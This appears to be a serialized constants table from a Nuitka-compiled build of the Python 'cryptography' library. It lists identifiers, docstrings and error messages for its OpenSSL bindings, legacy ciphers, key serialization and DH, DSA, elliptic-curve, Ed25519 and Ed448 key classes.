cryptography.hazmat.bindings>u.cryptography.hazmat.bindings.openssl._conditionalJaSSL_CTX_set_cert_cbaSSL_set_cert_cbLaSSL_ST_BEFOREaSSL_ST_OKaSSL_ST_INITaSSL_ST_RENEGOTIATEaTLS_ST_BEFOREaTLS_ST_OKaSSL_CTX_set1_sigalgs_listaSSL_CTX_use_psk_identity_hintaSSL_CTX_set_psk_server_callbackaSSL_CTX_set_psk_client_callbackLaSSL_CTX_set_psk_find_session_callbackaSSL_CTX_set_psk_use_session_callbackaCryptography_SSL_SESSION_newaSSL_CIPHER_findaSSL_SESSION_set1_master_keyaSSL_SESSION_set_cipheraSSL_SESSION_set_protocol_versionaSSL_CTX_add_client_custom_extaSSL_CTX_add_server_custom_extaSSL_extension_supportedLaSSL_VERIFY_POST_HANDSHAKEaSSL_CTX_set_ciphersuitesaSSL_verify_client_post_handshakeaSSL_CTX_set_post_handshake_authaSSL_set_post_handshake_authaSSL_SESSION_get_max_early_dataaSSL_write_early_dataaSSL_read_early_dataaSSL_CTX_set_max_early_dataLaENGINE_by_idaENGINE_initaENGINE_finishaENGINE_get_default_RANDaENGINE_set_default_RANDaENGINE_unregister_RANDaENGINE_ctrl_cmdaENGINE_freeaENGINE_get_nameaENGINE_ctrl_cmd_stringaENGINE_load_builtin_enginesaENGINE_load_private_keyaENGINE_load_public_keyaSSL_CTX_set_client_cert_engineaSSL_get0_verified_chainaSSL_CTX_set_tlsext_use_srtpaSSL_set_tlsext_use_srtpaSSL_get_selected_srtp_profileaSSL_OP_NO_RENEGOTIATIONaDTLS_get_data_mtuLaSSL_OP_COOKIE_EXCHANGEaDTLSv1_listenaSSL_CTX_set_cookie_generate_cbaSSL_CTX_set_cookie_verify_cbaBN_prime_checks_for_sizeaSSL_R_UNEXPECTED_EOF_WHILE_READINGaSSL_OP_IGNORE_UNEXPECTED_EOFaSSL_get_extms_supporta__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsDareturnulist[str]acryptography_has_set_cert_cbacryptography_has_ssl_stacryptography_has_tls_stacryptography_has_ssl_sigalgsacryptography_has_pskacryptography_has_psk_tlsv13acryptography_has_custom_extacryptography_has_tlsv13_functionsacryptography_has_engineacryptography_has_verified_chainacryptography_has_srtpacryptography_has_op_no_renegotiationacryptography_has_dtls_get_data_mtuacryptography_has_ssl_cookieacryptography_has_prime_checksacryptography_has_unexpected_eof_while_readingacryptography_has_ssl_op_ignore_unexpected_eofacryptography_has_get_extms_supportaCryptography_HAS_SET_CERT_CBaCryptography_HAS_SSL_STaCryptography_HAS_TLS_STaCryptography_HAS_SIGALGSaCryptography_HAS_PSKaCryptography_HAS_PSK_TLSv1_3aCryptography_HAS_CUSTOM_EXTaCryptography_HAS_TLSv1_3_FUNCTIONSaCryptography_HAS_ENGINEaCryptography_HAS_VERIFIED_CHAINaCryptography_HAS_SRTPaCryptography_HAS_OP_NO_RENEGOTIATIONaCryptography_HAS_DTLS_GET_DATA_MTUaCryptography_HAS_SSL_COOKIEaCryptography_HAS_PRIME_CHECKSaCryptography_HAS_UNEXPECTED_EOF_WHILE_READINGaCryptography_HAS_SSL_OP_IGNORE_UNEXPECTED_EOFaCryptography_HAS_GET_EXTMS_SUPPORTaCONDITIONAL_NAMESucryptography\hazmat\bindings\openssl\_conditional.pyu<module cryptography.hazmat.bindings.openssl._conditional>u.cryptography.hazmat.bindings.openssl.bindingXaopensslacapture_error_stackaInternalErroruUnknown OpenSSL error. This error is commonly encountered when another library is not cleaning up the OpenSSL error stack. If you are using cryptography with another library that uses OpenSSL try disabling it before reporting a bug. Otherwise please file an issue at https://github.com/pyca/cryptography/issues with information on how to reproduce this. (uw)aModuleTypeTaliba_original_libaitemsutoo many values to unpack (expected 2)aexcluded_namesaupdatea_ensure_ffi_initializeda_init_locka__enter__a__exit__a_lib_loadedabuild_conditional_librarya_opensslalibaCONDITIONAL_NAMESTnnnaffiastringaCRYPTOGRAPHY_PACKAGE_VERSIONaencodeTaasciiuThe version of cryptography does not match the loaded shared object. This can happen if you have multiple copies of cryptography installed in your Python path. Please try creating a new virtual environment to resolve this issue. Loaded python version: u, shared object version: a_openssl_assertaOpenSSL_version_numaopenssl_versiona__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaosasysathreadinglatypesatypingawarningsacryptographyucryptography.exceptionsTaInternalErrorucryptography.hazmat.bindings._rustTa_opensslaopensslucryptography.hazmat.bindings.openssl._conditionalTaCONDITIONAL_NAMESDaokareturnaboolaNoneDalibaconditional_namesareturnutyping.Anyudict[str, typing.Callable[[], list[str]]]utyping.Anyucryptography.hazmat.bindings.openssl.bindinga__module__u
    OpenSSL API wrapper.
    aBindinga__qualname__a__annotations__utyping.ClassVaraLockDareturnaNonea__init__uBinding.__init__uBinding._ensure_ffi_initializedainit_static_locksuBinding.init_static_locksDaversionareturnastraNonea_verify_package_versiona__version__aenvironagetTaPROCESSOR_ARCHITEW6432awarnuYou are using cryptography on a 32-bit Python on a 64-bit Windows Operating System. Cryptography will be significantly faster if you switch to using a 64-bit Python.aUserWarningDastacklevellucryptography\hazmat\bindings\openssl\binding.pyu<module cryptography.hazmat.bindings.openssl.binding>Ta__class__TaselfTaclsTaokaerrorsTaversionaso_package_versionTalibaconditional_namesaconditional_libaexcluded_namesaconditionanames_cbaattr.cryptography.hazmat.bindings.openssla__doc__a__file__apathadirnameajoinaenvironagetTaNUITKA_PACKAGE_cryptographyu\not_existinguhazmat\bindings\opensslTaNUITKA_PACKAGE_cryptography_hazmatu\not_existingubindings\opensslTaNUITKA_PACKAGE_cryptography_hazmat_bindingsu\not_existingaopensslTaNUITKA_PACKAGE_cryptography_hazmat_bindings_opensslu\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__ucryptography\hazmat\bindings\openssl\__init__.pyu<module cryptography.hazmat.bindings.openssl>u.cryptography.hazmatDa__doc__a__file__apathadirnameajoinaenvironagetTaNUITKA_PACKAGE_cryptographyu\not_existingahazmatTaNUITKA_PACKAGE_cryptography_hazmatu\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__aannotationsucryptography\hazmat\__init__.pyu<module cryptography.hazmat>u.cryptography.hazmat.decrepit.ciphers.algorithmsAKa_verify_key_sizeakeyl:nlna__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsucryptography.hazmat.primitives._cipheralgorithmTaBlockCipherAlgorithmaCipherAlgorithma_verify_key_sizelaBlockCipherAlgorithmaCipherAlgorithma__prepare__aARC4a__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.hazmat.decrepit.ciphers.algorithmsa__module__a__qualname__aRC4anameafrozensetLl(l8l@lPllllPl@lllll(lPl8akey_sizesDakeyabytesa__init__uARC4.__init__apropertyDareturnaintakey_sizeuARC4.key_sizea__orig_bases__aTripleDESu3DESl@ablock_sizellPl@lluTripleDES.__init__uTripleDES.key_sizeaBlowfisharangeTl ll;l lluBlowfish.__init__uBlowfish.key_sizeaCAST5Tl(ll;l(lluCAST5.__init__uCAST5.key_sizeaSEEDPluSEED.__init__uSEED.key_sizeaIDEAuIDEA.__init__uIDEA.key_sizeaRC2uRC2.__init__uRC2.key_sizeucryptography\hazmat\decrepit\ciphers\algorithms.pyu<module cryptography.hazmat.decrepit.ciphers.algorithms>Ta__class__TaselfakeyTaselfu.cryptography.hazmat.decrepit.ciphersa__doc__a__file__apathadirnameajoinaenvironagetTaNUITKA_PACKAGE_cryptographyu\not_existinguhazmat\decrepit\ciphersTaNUITKA_PACKAGE_cryptography_hazmatu\not_existingudecrepit\ciphersTaNUITKA_PACKAGE_cryptography_hazmat_decrepitu\not_existingaciphersTaNUITKA_PACKAGE_cryptography_hazmat_decrepit_ciphersu\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__aannotationsucryptography\hazmat\decrepit\ciphers\__init__.pyu<module cryptography.hazmat.decrepit.ciphers>u.cryptography.hazmat.decrepita__doc__a__file__apathadirnameajoinaenvironagetTaNUITKA_PACKAGE_cryptographyu\not_existinguhazmat\decrepitTaNUITKA_PACKAGE_cryptography_hazmatu\not_existingadecrepitTaNUITKA_PACKAGE_cryptography_hazmat_decrepitu\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__aannotationsucryptography\hazmat\decrepit\__init__.pyu<module cryptography.hazmat.decrepit>u.cryptography.hazmat.primitives._asymmetricD a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaabclametaclassaABCMetaa__prepare__TaAsymmetricPaddingTa__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.hazmat.primitives._asymmetrica__module__aAsymmetricPaddinga__qualname__apropertyaabstractmethodDareturnastru
        A string naming this padding (e.g. "PSS", "PKCS1").
        anameuAsymmetricPadding.nameucryptography\hazmat\primitives\_asymmetric.pyu<module cryptography.hazmat.primitives._asymmetric>Ta__class__Taselfu.cryptography.hazmat.primitives._cipheralgorithm;autilsa_check_byteslikeakeylakey_sizesuInvalid key size (uu) for anamew.a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaabclacryptographyTautilsametaclassaABCMetaa__prepare__TaCipherAlgorithmTa__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.hazmat.primitives._cipheralgorithma__module__aCipherAlgorithma__qualname__apropertyaabstractmethodDareturnastru
        A string naming this mode (e.g. "AES", "Camellia").
        uCipherAlgorithm.nameDareturnufrozenset[int]u
        Valid key sizes for this algorithm in bits
        uCipherAlgorithm.key_sizesDareturnaintu
        The size of the key being used as an integer in bits (e.g. 128, 256).
        akey_sizeuCipherAlgorithm.key_sizeaBlockCipherAlgorithma__annotations__abytesu
        The size of a block as an integer in bits (e.g. 64, 128).
        ablock_sizeuBlockCipherAlgorithm.block_sizea__orig_bases__DaalgorithmakeyareturnaCipherAlgorithmabytespa_verify_key_sizeucryptography\hazmat\primitives\_cipheralgorithm.pyu<module cryptography.hazmat.primitives._cipheralgorithm>Ta__class__TaalgorithmakeyTaself.cryptography.hazmat.primitives._serializationopaPrivateFormataOpenSSHaPKCS12uencryption_builder only supported with PrivateFormat.OpenSSH and PrivateFormat.PKCS12aKeySerializationEncryptionBuilderuPassword must be 1 or more bytes.apassworda_formata_kdf_roundsa_hmac_hasha_key_cert_algorithmukdf_rounds already setukdf_rounds must be an integerlukdf_rounds must be a positive integerTa_kdf_roundsa_hmac_hasha_key_cert_algorithmuhmac_hash only supported with PrivateFormat.PKCS12uhmac_hash already setukey_cert_algorithm only supported with PrivateFormat.PKCS12ukey_cert_algorithm already seta_KeySerializationEncryptionTakdf_roundsahmac_hashakey_cert_algorithma__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaabclacryptographyTautilsautilsucryptography.hazmat.primitives.hashesTaHashAlgorithmaHashAlgorithmaEnuma__prepare__aPBESa__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.hazmat.primitives._serializationa__module__a__qualname__uPBESv1 using SHA1 and 3-Key TripleDESaPBESv1SHA1And3KeyTripleDESCBCuPBESv2 using SHA256 PBKDF2 and AES256 CBCaPBESv2SHA256AndAES256CBCa__orig_bases__aEncodingaPEMaDERaRawuANSI X9.62aX962uS/MIMEaSMIMEaPKCS8aTraditionalOpenSSLDareturnaKeySerializationEncryptionBuilderaencryption_builderuPrivateFormat.encryption_builderaPublicFormatuX.509 subjectPublicKeyInfo with PKCS#1aSubjectPublicKeyInfouRaw PKCS#1aPKCS1uX9.62 Compressed PointaCompressedPointuX9.62 Uncompressed PointaUncompressedPointaParameterFormataPKCS3ametaclassaABCMetaTaKeySerializationEncryptionTaKeySerializationEncryptionaBestAvailableEncryptionDapasswordabytesa__init__uBestAvailableEncryption.__init__aNoEncryptionDa_kdf_roundsa_hmac_hasha_key_cert_algorithmnnnDaformata_kdf_roundsa_hmac_hasha_key_cert_algorithmareturnaPrivateFormatuint | NoneuHashAlgorithm | NoneuPBES | NoneaNoneuKeySerializationEncryptionBuilder.__init__DaroundsareturnaintaKeySerializationEncryptionBuilderakdf_roundsuKeySerializationEncryptionBuilder.kdf_roundsDaalgorithmareturnaHashAlgorithmaKeySerializationEncryptionBuilderahmac_hashuKeySerializationEncryptionBuilder.hmac_hashDaalgorithmareturnaPBESaKeySerializationEncryptionBuilderakey_cert_algorithmuKeySerializationEncryptionBuilder.key_cert_algorithmDapasswordareturnabytesaKeySerializationEncryptionabuilduKeySerializationEncryptionBuilder.buildDaformatapasswordakdf_roundsahmac_hashakey_cert_algorithmaPrivateFormatabytesuint | NoneuHashAlgorithm | NoneuPBES | Noneu_KeySerializationEncryption.__init__ucryptography\hazmat\primitives\_serialization.pyu<module cryptography.hazmat.primitives._serialization>Ta__class__TaselfapasswordTaselfaformata_kdf_roundsa_hmac_hasha_key_cert_algorithmTaselfaformatapasswordakdf_roundsahmac_hashakey_cert_algorithmTaselfTaselfaalgorithmTaselfaroundsu.cryptography.hazmat.primitives.asymmetric'a__doc__a__file__apathadirnameajoinaenvironagetTaNUITKA_PACKAGE_cryptographyu\not_existinguhazmat\primitives\asymmetricTaNUITKA_PACKAGE_cryptography_hazmatu\not_existinguprimitives\asymmetricTaNUITKA_PACKAGE_cryptography_hazmat_primitivesu\not_existingaasymmetricTaNUITKA_PACKAGE_cryptography_hazmat_primitives_asymmetricu\not_existinga__path__a__spec__aoriginahas_locationasubmodule_search_locationsa__cached__ucryptography\hazmat\primitives\asymmetric\__init__.pyu<module cryptography.hazmat.primitives.asymmetric>u.cryptography.hazmat.primitives.asymmetric.dh
fa__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaabclucryptography.hazmat.bindings._rustTaopensslaopensslarust_opensslucryptography.hazmat.primitivesTa_serializationa_serializationadhagenerate_parametersaDHPrivateNumbersaDHPublicNumbersaDHParameterNumbersametaclassaABCMetaa__prepare__TaDHParametersTa__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.hazmat.primitives.asymmetric.dha__module__aDHParametersa__qualname__aabstractmethodDareturnaDHPrivateKeyu
        Generates and returns a DHPrivateKey.
        agenerate_private_keyuDHParameters.generate_private_keyDaencodingaformatareturnu_serialization.Encodingu_serialization.ParameterFormatabytesu
        Returns the parameters serialized as bytes.
        aparameter_bytesuDHParameters.parameter_bytesDareturnaDHParameterNumbersu
        Returns a DHParameterNumbers.
        aparameter_numbersuDHParameters.parameter_numbersaDHParametersWithSerializationaregisterTaDHPublicKeyTaDHPublicKeyapropertyDareturnaintu
        The bit length of the prime modulus.
        akey_sizeuDHPublicKey.key_sizeDareturnaDHParametersu
        The DHParameters object associated with this public key.
        aparametersuDHPublicKey.parametersDareturnaDHPublicNumbersu
        Returns a DHPublicNumbers.
        apublic_numbersuDHPublicKey.public_numbersDaencodingaformatareturnu_serialization.Encodingu_serialization.PublicFormatabytesu
        Returns the key serialized as bytes.
        apublic_bytesuDHPublicKey.public_bytesDaotherareturnaobjectaboolu
        Checks equality.
        a__eq__uDHPublicKey.__eq__aDHPublicKeyWithSerializationTaDHPrivateKeyTaDHPrivateKeyuDHPrivateKey.key_sizeDareturnaDHPublicKeyu
        The DHPublicKey associated with this private key.
        apublic_keyuDHPrivateKey.public_keyu
        The DHParameters object associated with this private key.
        uDHPrivateKey.parametersDapeer_public_keyareturnaDHPublicKeyabytesu
        Given peer's DHPublicKey, carry out the key exchange and
        return shared key as bytes.
        aexchangeuDHPrivateKey.exchangeDareturnaDHPrivateNumbersu
        Returns a DHPrivateNumbers.
        aprivate_numbersuDHPrivateKey.private_numbersDaencodingaformataencryption_algorithmareturnu_serialization.Encodingu_serialization.PrivateFormatu_serialization.KeySerializationEncryptionabytesaprivate_bytesuDHPrivateKey.private_bytesaDHPrivateKeyWithSerializationucryptography\hazmat\primitives\asymmetric\dh.pyu<module cryptography.hazmat.primitives.asymmetric.dh>Ta__class__TaselfaotherTaselfapeer_public_keyTaselfTaselfaencodingaformatTaselfaencodingaformataencryption_algorithmu.cryptography.hazmat.primitives.asymmetric.dsa`tTllll uKey size must be 1024, 2048, 3072, or 4096 bits.arust_openssladsaagenerate_parametersagenerate_private_keya__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaabclatypingucryptography.hazmat.bindings._rustTaopensslaopensslucryptography.hazmat.primitivesTa_serializationahashesa_serializationahashesucryptography.hazmat.primitives.asymmetricTautilsautilsaasym_utilsametaclassaABCMetaa__prepare__TaDSAParametersTa__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.hazmat.primitives.asymmetric.dsaa__module__aDSAParametersa__qualname__aabstractmethodDareturnaDSAPrivateKeyu
        Generates and returns a DSAPrivateKey.
        uDSAParameters.generate_private_keyDareturnaDSAParameterNumbersu
        Returns a DSAParameterNumbers.
        aparameter_numbersuDSAParameters.parameter_numbersaDSAParametersWithNumbersaregisterTaDSAPrivateKeyTaDSAPrivateKeyapropertyDareturnaintu
        The bit length of the prime modulus.
        akey_sizeuDSAPrivateKey.key_sizeDareturnaDSAPublicKeyu
        The DSAPublicKey associated with this private key.
        apublic_keyuDSAPrivateKey.public_keyDareturnaDSAParametersu
        The DSAParameters object associated with this private key.
        aparametersuDSAPrivateKey.parametersDadataaalgorithmareturnabytesuasym_utils.Prehashed | hashes.HashAlgorithmabytesu
        Signs the data
        asignuDSAPrivateKey.signDareturnaDSAPrivateNumbersu
        Returns a DSAPrivateNumbers.
        aprivate_numbersuDSAPrivateKey.private_numbersDaencodingaformataencryption_algorithmareturnu_serialization.Encodingu_serialization.PrivateFormatu_serialization.KeySerializationEncryptionabytesu
        Returns the key serialized as bytes.
        aprivate_bytesuDSAPrivateKey.private_bytesaDSAPrivateKeyWithSerializationTaDSAPublicKeyTaDSAPublicKeyuDSAPublicKey.key_sizeu
        The DSAParameters object associated with this public key.
        uDSAPublicKey.parametersDareturnaDSAPublicNumbersu
        Returns a DSAPublicNumbers.
        apublic_numbersuDSAPublicKey.public_numbersDaencodingaformatareturnu_serialization.Encodingu_serialization.PublicFormatabytesapublic_bytesuDSAPublicKey.public_bytesDasignatureadataaalgorithmareturnabytespuasym_utils.Prehashed | hashes.HashAlgorithmaNoneu
        Verifies the signature of the data.
        averifyuDSAPublicKey.verifyDaotherareturnaobjectaboolu
        Checks equality.
        a__eq__uDSAPublicKey.__eq__aDSAPublicKeyWithSerializationaDSAPrivateNumbersaDSAPublicNumbersaDSAParameterNumbersTnDakey_sizeabackendareturnaintutyping.AnyaDSAParametersDakey_sizeabackendareturnaintutyping.AnyaDSAPrivateKeyucryptography\hazmat\primitives\asymmetric\dsa.pyu<module cryptography.hazmat.primitives.asymmetric.dsa>Ta__class__TaselfaotherTakey_sizeabackendTaselfTakey_sizeabackendaparametersTaselfaencodingaformataencryption_algorithmTaselfaencodingaformatTaselfadataaalgorithmTaselfasignatureadataaalgorithmu.cryptography.hazmat.primitives.asymmetric.ecautilsa_check_bytesadataudata must not be an empty byte stringlTllluUnsupported elliptic curve point typearust_opensslaecafrom_public_bytesucryptography.hazmat.backends.openssl.backendTabackendabackendaecdsa_deterministic_supportedaUnsupportedAlgorithmuECDSA with deterministic signature (RFC 6979) is not supported by this version of OpenSSL.a_ReasonsaUNSUPPORTED_PUBLIC_KEY_ALGORITHMa_algorithma_deterministic_signinguprivate_value must be an integer type.uprivate_value must be a positive integer.aderive_private_keya_OID_TO_CURVEuThe provided object identifier has no matching elliptic curve classa__doc__a__file__a__spec__aoriginahas_locationa__cached__a__annotations__aannotationsaabcatypingacryptographyTautilsucryptography.exceptionsTaUnsupportedAlgorithma_Reasonsucryptography.hazmat._oidTaObjectIdentifieraObjectIdentifierucryptography.hazmat.bindings._rustTaopensslaopensslucryptography.hazmat.primitivesTa_serializationahashesa_serializationahashesucryptography.hazmat.primitives.asymmetricaasym_utilsucryptography.hazmat.primitives.asymmetric.eca__module__aEllipticCurveOIDa__qualname__Tu1.2.840.10045.3.1.1aSECP192R1Tu1.3.132.0.33aSECP224R1Tu1.3.132.0.10aSECP256K1Tu1.2.840.10045.3.1.7aSECP256R1Tu1.3.132.0.34aSECP384R1Tu1.3.132.0.35aSECP521R1Tu1.3.36.3.3.2.8.1.1.7aBRAINPOOLP256R1Tu1.3.36.3.3.2.8.1.1.11aBRAINPOOLP384R1Tu1.3.36.3.3.2.8.1.1.13aBRAINPOOLP512R1Tu1.3.132.0.1aSECT163K1Tu1.3.132.0.15aSECT163R2Tu1.3.132.0.26aSECT233K1Tu1.3.132.0.27aSECT233R1Tu1.3.132.0.16aSECT283K1Tu1.3.132.0.17aSECT283R1Tu1.3.132.0.36aSECT409K1Tu1.3.132.0.37aSECT409R1Tu1.3.132.0.38aSECT571K1Tu1.3.132.0.39aSECT571R1ametaclassaABCMetaa__prepare__TaEllipticCurveTa__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>aEllipticCurveapropertyaabstractmethodDareturnastru
        The name of the curve. e.g. secp256r1.
        anameuEllipticCurve.nameDareturnaintu
        Bit size of a secret scalar for the curve.
        akey_sizeuEllipticCurve.key_sizeTaEllipticCurveSignatureAlgorithmTaEllipticCurveSignatureAlgorithmDareturnuasym_utils.Prehashed | hashes.HashAlgorithmu
        The digest algorithm used with this signature.
        aalgorithmuEllipticCurveSignatureAlgorithm.algorithmTaEllipticCurvePrivateKeyTaEllipticCurvePrivateKeyDaalgorithmapeer_public_keyareturnaECDHaEllipticCurvePublicKeyabytesu
        Performs a key exchange operation using the provided algorithm with the
        provided peer's public key.
        aexchangeuEllipticCurvePrivateKey.exchangeDareturnaEllipticCurvePublicKeyu
        The EllipticCurvePublicKey for this private key.
        apublic_keyuEllipticCurvePrivateKey.public_keyDareturnaEllipticCurveu
        The EllipticCurve that this key is on.
        acurveuEllipticCurvePrivateKey.curveuEllipticCurvePrivateKey.key_sizeDadataasignature_algorithmareturnabytesaEllipticCurveSignatureAlgorithmabytesu
        Signs the data
        asignuEllipticCurvePrivateKey.signDareturnaEllipticCurvePrivateNumbersu
        Returns an EllipticCurvePrivateNumbers.
        aprivate_numbersuEllipticCurvePrivateKey.private_numbersDaencodingaformataencryption_algorithmareturnu_serialization.Encodingu_serialization.PrivateFormatu_serialization.KeySerializationEncryptionabytesu
        Returns the key serialized as bytes.
        aprivate_bytesuEllipticCurvePrivateKey.private_bytesaEllipticCurvePrivateKeyWithSerializationaregisteraECPrivateKeyTaEllipticCurvePublicKeyTaEllipticCurvePublicKeyuEllipticCurvePublicKey.curveuEllipticCurvePublicKey.key_sizeDareturnaEllipticCurvePublicNumbersu
        Returns an EllipticCurvePublicNumbers.
        apublic_numbersuEllipticCurvePublicKey.public_numbersDaencodingaformatareturnu_serialization.Encodingu_serialization.PublicFormatabytesapublic_bytesuEllipticCurvePublicKey.public_bytesDasignatureadataasignature_algorithmareturnabytespaEllipticCurveSignatureAlgorithmaNoneu
        Verifies the signature of the data.
        averifyuEllipticCurvePublicKey.verifyaclassmethodDacurveadataareturnaEllipticCurveabytesaEllipticCurvePublicKeyafrom_encoded_pointuEllipticCurvePublicKey.from_encoded_pointDaotherareturnaobjectaboolu
        Checks equality.
        a__eq__uEllipticCurvePublicKey.__eq__aEllipticCurvePublicKeyWithSerializationaECPublicKeyaEllipticCurvePrivateNumbersaEllipticCurvePublicNumbersasect571r1la__orig_bases__asect409r1lasect283r1lasect233r1lasect163r2lasect571k1lasect409k1asect283k1asect233k1asect163k1asecp521r1lasecp384r1lasecp256r1lasecp256k1asecp224r1lasecp192r1laBrainpoolP256R1abrainpoolP256r1aBrainpoolP384R1abrainpoolP384r1aBrainpoolP512R1abrainpoolP512r1laprime192v1aprime256v1a_CURVE_TYPESudict[str, EllipticCurve]aECDSATFDaalgorithmadeterministic_signinguasym_utils.Prehashed | hashes.HashAlgorithmaboola__init__uECDSA.__init__uECDSA.algorithmDareturnabooladeterministic_signinguECDSA.deterministic_signingagenerate_private_keyTnDaprivate_valueacurveabackendareturnaintaEllipticCurveutyping.AnyaEllipticCurvePrivateKeyaECDHDaoidareturnaObjectIdentifierutype[EllipticCurve]aget_curve_for_oiducryptography\hazmat\primitives\asymmetric\ec.pyu<module cryptography.hazmat.primitives.asymmetric.ec>Ta__class__TaselfaotherTaselfaalgorithmadeterministic_signingabackendTaselfTaprivate_valueacurveabackendTaselfaalgorithmapeer_public_keyTaclsacurveadataTaoidTaselfaencodingaformataencryption_algorithmTaselfaencodingaformatTaselfadataasignature_algorithmTaselfasignatureadataasignature_algorithmu.cryptography.hazmat.primitives.asymmetric.ed25519F
aucryptography.hazmat.backends.openssl.backendTabackendlabackendaed25519_supportedaUnsupportedAlgorithmued25519 is not supported by this version of OpenSSL.a_ReasonsaUNSUPPORTED_PUBLIC_KEY_ALGORITHMarust_opensslaed25519afrom_public_bytesagenerate_keyafrom_private_bytesa__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaabcucryptography.exceptionsTaUnsupportedAlgorithma_Reasonsucryptography.hazmat.bindings._rustTaopensslaopensslucryptography.hazmat.primitivesTa_serializationa_serializationametaclassaABCMetaa__prepare__TaEd25519PublicKeyTa__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.hazmat.primitives.asymmetric.ed25519a__module__aEd25519PublicKeya__qualname__aclassmethodDadataareturnabytesaEd25519PublicKeyuEd25519PublicKey.from_public_bytesaabstractmethodDaencodingaformatareturnu_serialization.Encodingu_serialization.PublicFormatabytesu
        The serialized bytes of the public key.
        apublic_bytesuEd25519PublicKey.public_bytesDareturnabytesu
        The raw bytes of the public key.
        Equivalent to public_bytes(Raw, Raw).
        apublic_bytes_rawuEd25519PublicKey.public_bytes_rawDasignatureadataareturnabytespaNoneu
        Verify the signature.
        averifyuEd25519PublicKey.verifyDaotherareturnaobjectaboolu
        Checks equality.
        a__eq__uEd25519PublicKey.__eq__aregisterTaEd25519PrivateKeyTaEd25519PrivateKeyDareturnaEd25519PrivateKeyagenerateuEd25519PrivateKey.generateDadataareturnabytesaEd25519PrivateKeyuEd25519PrivateKey.from_private_bytesDareturnaEd25519PublicKeyu
        The Ed25519PublicKey derived from the private key.
        apublic_keyuEd25519PrivateKey.public_keyDaencodingaformataencryption_algorithmareturnu_serialization.Encodingu_serialization.PrivateFormatu_serialization.KeySerializationEncryptionabytesu
        The serialized bytes of the private key.
        aprivate_bytesuEd25519PrivateKey.private_bytesu
        The raw bytes of the private key.
        Equivalent to private_bytes(Raw, Raw, NoEncryption()).
        aprivate_bytes_rawuEd25519PrivateKey.private_bytes_rawDadataareturnabytespu
        Signs the data.
        asignuEd25519PrivateKey.signucryptography\hazmat\primitives\asymmetric\ed25519.pyu<module cryptography.hazmat.primitives.asymmetric.ed25519>Ta__class__TaselfaotherTaclsadataabackendTaclsabackendTaselfaencodingaformataencryption_algorithmTaselfTaselfaencodingaformatTaselfadataTaselfasignatureadatau.cryptography.hazmat.primitives.asymmetric.ed448
bucryptography.hazmat.backends.openssl.backendTabackendlabackendaed448_supportedaUnsupportedAlgorithmued448 is not supported by this version of OpenSSL.a_ReasonsaUNSUPPORTED_PUBLIC_KEY_ALGORITHMarust_opensslaed448afrom_public_bytesagenerate_keyafrom_private_bytesa__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaabcucryptography.exceptionsTaUnsupportedAlgorithma_Reasonsucryptography.hazmat.bindings._rustTaopensslaopensslucryptography.hazmat.primitivesTa_serializationa_serializationametaclassaABCMetaa__prepare__TaEd448PublicKeyTa__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>ucryptography.hazmat.primitives.asymmetric.ed448a__module__aEd448PublicKeya__qualname__aclassmethodDadataareturnabytesaEd448PublicKeyuEd448PublicKey.from_public_bytesaabstractmethodDaencodingaformatareturnu_serialization.Encodingu_serialization.PublicFormatabytesu
        The serialized bytes of the public key.
        apublic_bytesuEd448PublicKey.public_bytesDareturnabytesu
        The raw bytes of the public key.
        Equivalent to public_bytes(Raw, Raw).
        apublic_bytes_rawuEd448PublicKey.public_bytes_rawDasignatureadataareturnabytespaNoneu
        Verify the signature.
        averifyuEd448PublicKey.verifyDaotherareturnaobjectaboolu
        Checks equality.
        a__eq__uEd448PublicKey.__eq__aregisterTaEd448PrivateKeyTaEd448PrivateKeyDareturnaEd448PrivateKeyagenerateuEd448PrivateKey.generateDadataareturnabytesaEd448PrivateKeyuEd448PrivateKey.from_private_bytesDareturnaEd448PublicKeyu
        The Ed448PublicKey derived from the private key.
        apublic_keyuEd448PrivateKey.public_keyDadataareturnabytespu
        Signs the data.
        asignuEd448PrivateKey.signDaencodingaformataencryption_algorithmareturnu_serialization.Encodingu_serialization.PrivateFormatu_serialization.KeySerializationEncryptionabytesu
        The serialized bytes of the private key.
        aprivate_bytesuEd448PrivateKey.private_bytesu
        The raw bytes of the private key.
        Equivalent to private_bytes(Raw, Raw, NoEncryption()).
